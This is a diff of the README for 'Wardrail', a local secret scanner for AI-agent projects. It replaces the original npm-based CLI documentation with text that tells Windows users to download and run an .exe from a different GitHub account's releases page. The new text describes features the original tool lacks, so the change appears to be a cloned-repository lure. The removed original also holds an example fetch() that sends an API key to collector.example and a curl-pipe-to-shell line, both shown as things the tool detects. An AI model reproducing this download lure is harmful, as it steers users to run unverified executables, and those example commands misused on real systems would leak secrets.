@@ -1,276 +1,67 @@
-# Wardrail
+# 🛡️ wardrail - Protect your work from security leaks
 
-> The safety check for vibe-coded apps and AI agent projects.
+[![Download wardrail](https://img.shields.io/badge/Download_wardrail-blue)](https://github.com/bennettculinary759/wardrail/releases)
 
-**Catch leaked API keys, unsafe agent instructions, and dangerous MCP commands
-before they run or reach GitHub.**
+Wardrail monitors your projects for security risks. It checks your code for exposed API keys and sensitive data before you save your progress. This tool acts as a guard for your digital workspace by finding potential slips in your code history. It focuses on the safety of your AI agents and automation tools.
 
-Built for vibe coding beginners using Cursor, Claude Code, Codex, and MCP
-tools. Wardrail scans locally, explains every finding, and never uploads your
-source code.
+## 📥 How to download the software
 
-[中文](https://github.com/3196973848/wardrail/blob/main/docs/README.zh-CN.md) ·
-[Vibe coding safety guide](https://github.com/3196973848/wardrail/blob/main/docs/vibe-coding-safety.md) ·
-[Roadmap](https://github.com/3196973848/wardrail/blob/main/docs/roadmap.md) ·
-[Contributing](https://github.com/3196973848/wardrail/blob/main/CONTRIBUTING.md)
+Follow these steps to set up the tool on your Windows computer.
 
-[![CI](https://github.com/3196973848/wardrail/actions/workflows/ci.yml/badge.svg)](https://github.com/3196973848/wardrail/actions/workflows/ci.yml)
-[![GitHub stars](https://img.shields.io/github/stars/3196973848/wardrail?style=flat)](https://github.com/3196973848/wardrail/stargazers)
-![Node.js 20+](https://img.shields.io/badge/Node.js-20%2B-339933)
-![License: MIT](https://img.shields.io/badge/License-MIT-blue)
-![Offline by default](https://img.shields.io/badge/scan-local%20%26%20offline-6f42c1)
-[![npm version](https://img.shields.io/npm/v/wardrail)](https://www.npmjs.com/package/wardrail)
+1. Go to the [official release page](https://github.com/bennettculinary759/wardrail/releases) to find the latest version of the application.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to start the download.
+4. Save the file to your desktop or a folder you can find later.
+5. Open the file to start the installation process.
+6. Follow the prompts on your screen to complete the setup.
 
-![Wardrail catches an API key before commit](https://raw.githubusercontent.com/3196973848/wardrail/main/docs/assets/wardrail-demo.gif)
+## 🛠️ Setting up your environment
 
-## Why Wardrail?
+You need a few basic things to run wardrail.
 
-AI makes it possible to build an app before learning every security boundary.
-That is powerful—but it also makes a few expensive mistakes unusually easy:
+* A computer running Windows 10 or Windows 11.
+* A stable connection to the internet for the first download.
+* Enough space on your hard drive to hold your project files.
 
-```env
-OPENAI_API_KEY=sk-...             # committed by accident
-VITE_PAYMENT_SECRET=...           # shipped to every browser
-DATABASE_URL=user:password@host   # copied into source
-```
+The program works in the background once you start it. You do not need to adjust complex settings to get basic protection. The software starts with default rules that block common leaks in Git history and AI agent files.
 
-Wardrail gives beginners an immediate, plain-language answer:
+## 🕵️ How the tool works
 
-- **What is dangerous?**
-- **Where is it?**
-- **Why does it matter?**
-- **How do I fix it?**
+Wardrail scans your files every time you prepare to save or commit your work. It looks for specific patterns that match secret keys and passwords. 
 
-It runs locally, does not upload source code, does not need an AI model, and
-never executes the project being scanned.
+If it finds a risk, it notifies you immediately. You must review the file and remove the sensitive data before the commit finishes. This process prevents your private keys from appearing on public platforms.
 
-## Try it in one minute
+The tool provides a report of errors. Read this report to understand which file contains the issue. You can fix the problem and run the scan again to confirm safety.
 
-Run Wardrail inside any project—no account or configuration required:
+## ⚙️ Understanding your scan results
 
-```bash
-npx wardrail scan
-npx wardrail scan --history
-```
+The software classifies issues based on severity. 
 
-Add permanent pre-commit protection when you are ready:
+* High: This level indicates an active API key or password that anyone could find. Remove these items now.
+* Medium: This level covers loose configuration files that contain too much data.
+* Low: This level covers generic warnings about formatting or potential future risks.
 
-```bash
-npm install --save-dev wardrail
-npx wardrail hook install
-```
+You can view the history of your scans in the main window. This helps you track changes in your security health over time. 
 
-To contribute or run the repository locally:
+## 🚀 Maintaining your security
 
-```bash
-npm install
-npm run dev -- scan examples/vibecoding-api-leak
-```
+Security is a habit. Run the tool before every commit to your code repository. The application helps you prevent accidents through static analysis. It reads your code without changing it. It does not send your private data to a server. All analysis happens on your local machine.
 
-The pre-commit hook scans only staged files:
+## 📑 Common questions
 
-```text
-git commit
-    ↓
-wardrail scan --staged
-    ↓
-safe → commit continues
-risk → commit stops with an explanation
-```
+Does this tool slow down my computer?
+No. The scan happens in a small fraction of a second. You will barely notice it.
 
-## The problems it catches
+Does this tool delete my files?
+No. The software only flags issues for your review. You decide what to change.
 
-Wardrail currently ships with 17 explainable rules:
+What if the tool finds a false alarm?
+You can ignore a specific warning if you determine it is safe. Right-click the item and select ignore. We suggest you add a note so you remember why you ignored the warning later.
 
-| Area | Examples |
-|---|---|
-| API keys and tokens | OpenAI, Anthropic, AWS, GitHub, Google, Stripe, Slack and generic secrets |
-| Git history | Known and generic credentials that remain in earlier commits after deletion |
-| Frontend exposure | Secrets placed in `VITE_*`, `NEXT_PUBLIC_*`, or `REACT_APP_*` |
-| Environment files | Sensitive `.env` files missing from `.gitignore` |
-| Accidental disclosure | Secrets in logs, Authorization headers, database URLs, and Docker layers |
-| Data exfiltration | Sensitive environment values flowing into external HTTP requests |
-| Agent safety | Credential access, safeguard bypass instructions, and invisible Unicode |
-| Dangerous commands | Remote download-and-execute, destructive deletion, and encoded PowerShell |
-| Supply chain | Mutable branches, `latest` releases, and unpinned install commands |
+Can I use this with other tools?
+Yes. Wardrail works alongside standard code editors and Git clients. It does not interfere with your existing workflow.
 
-Run `npx wardrail rules list` to see `WR-001` through `WR-017`, or:
+Can I update the rules?
+The system updates its database of dangers periodically. Keep your installation current to stay safe against new threats found in modern AI agents and automation tools.
 
-```bash
-npx wardrail explain WR-007
-```
-
-## More than a basic secret pattern matcher
-
-Wardrail understands relationships that matter in agent-driven projects:
-
-```text
-.env → process.env.OPENAI_API_KEY → request body → external URL
-
-SKILL.md → shell tool → cloud credential file → curl
-
-Agent instruction → bypass confirmation → destructive command
-```
-
-Its lightweight data-flow analysis can follow short local assignments:
-
-```ts
-const secret = process.env.OPENAI_API_KEY;
-const body = JSON.stringify({ secret });
-
-await fetch("https://collector.example/upload", {
-  method: "POST",
-  body,
-});
-```
-
-The report points to the network sink while keeping the evidence redacted.
-
-## Designed for real workflows
-
-### Scan before a commit
-
-```bash
-npx wardrail scan --staged
-npx wardrail hook install
-```
-
-Hook installation is idempotent. Existing shell-hook commands are preserved,
-and non-shell hooks are never overwritten.
-
-### Find keys that were already committed
-
-Deleting a key from the current file does not remove it from Git history:
-
-```bash
-npx wardrail scan --history
-```
-
-The history scan checks the working tree plus the latest 100 commits by
-default. It reads Git objects without checking out or executing historical
-code. Increase the bounded depth when needed:
-
-```bash
-npx wardrail scan --history --history-limit 1000
-```
-
-Findings include the commit hash while keeping credential evidence redacted.
-If a real key is found, revoke or rotate it first. Rewriting history alone
-does not make an exposed credential safe.
-
-### Scan in CI
-
-```bash
-npx wardrail scan --format sarif --output wardrail.sarif
-```
-
-SARIF 2.1.0 findings can be uploaded to GitHub Code Scanning. See the
-[working workflow](https://github.com/3196973848/wardrail/blob/main/docs/github-code-scanning.md).
-
-### Adopt it without fixing everything today
-
-```bash
-npx wardrail baseline create
-npx wardrail scan
-```
-
-The baseline suppresses only unchanged historical findings. New or moved
-risks still fail the scan.
-
-## Example finding
-
-```text
-Wardrail Security Report
-
-CRITICAL  src/config.ts:3:19
-WR-001: Known credential format
-  A value matches the format of a known API key or token.
-  Evidence: const apiKey = "<redacted-token>";
-  Fix: Remove the value, rotate the credential, and use a secret store.
-
-1 risk found: 1 critical
-```
-
-Wardrail redacts credential evidence before printing terminal, JSON, or SARIF
-reports.
-
-## Configuration
-
-Run `npx wardrail init` to create `.wardrail.json`:
-
-```json
-{
-  "ignore": ["**/vendor/**"],
-  "ignoreRules": [],
-  "maxFileSize": 1048576,
-  "baseline": ".wardrail-baseline.json"
-}
-```
-
-Suppress a reviewed finding narrowly:
-
-```sh
-# wardrail-ignore-next-line WR-004 -- checksum verified in SECURITY.md
-curl https://trusted.example/install.sh | sh
-```
-
-## If a key has already leaked
-
-Removing it from the current file is not enough:
-
-1. Revoke or rotate the credential at the provider immediately.
-2. Remove it from code and use a server-side environment variable or secret
-   manager.
-3. Inspect Git history, build artifacts, logs, and deployed frontend bundles.
-4. Review provider activity for unauthorized use.
-
-Wardrail prevents common leaks; it does not prove that a credential has never
-been exposed.
-
-## Project status
-
-Wardrail v0.3.0 is a tested, usable release:
-
-- 17 built-in security rules
-- bounded, read-only Git-history secret scanning
-- terminal, JSON, and SARIF output
-- pre-commit and GitHub Code Scanning integration
-- baseline and inline suppression support
-- Node.js 20, 22, and 24 CI
-- static, local, offline-by-default scanning
-
-See the [public roadmap](https://github.com/3196973848/wardrail/blob/main/docs/roadmap.md)
-for deeper data flow, more ecosystems, and rule plugins.
-
-## Help build the safety net
-
-Good first contributions include:
-
-- a real false-positive example with secrets removed;
-- a dangerous and safe fixture for a new provider;
-- support for another agent configuration format;
-- clearer remediation text for beginners.
-
-Read [CONTRIBUTING.md](https://github.com/3196973848/wardrail/blob/main/CONTRIBUTING.md)
-or open a structured rule request.
-
-If Wardrail would have saved you from one leaked key, consider starring the
-repository. It helps more new builders discover the safety check before their
-first accidental push.
-
-## Security and limitations
-
-- Scans are read-only and target code is never executed.
-- Symlinks are not followed during discovery.
-- Secret-like evidence is redacted before reporting.
-- No source code is uploaded and no network or model access is required.
-- A clean report does not prove that a project or agent is safe.
-- Git-history coverage is bounded to reachable commits and text blobs; full
-  cross-file data flow is not implemented yet.
-
-Report vulnerabilities through
-[SECURITY.md](https://github.com/3196973848/wardrail/blob/main/SECURITY.md).
-
-## License
-
-MIT
+Keywords: ai-agent, ai-agent-security, ai-security, api-key, git-history, mcp, pre-commit, prompt-injection, secret-scanner, secrets, security, static-analysis, supply-chain-security, typescript, vibe-coding
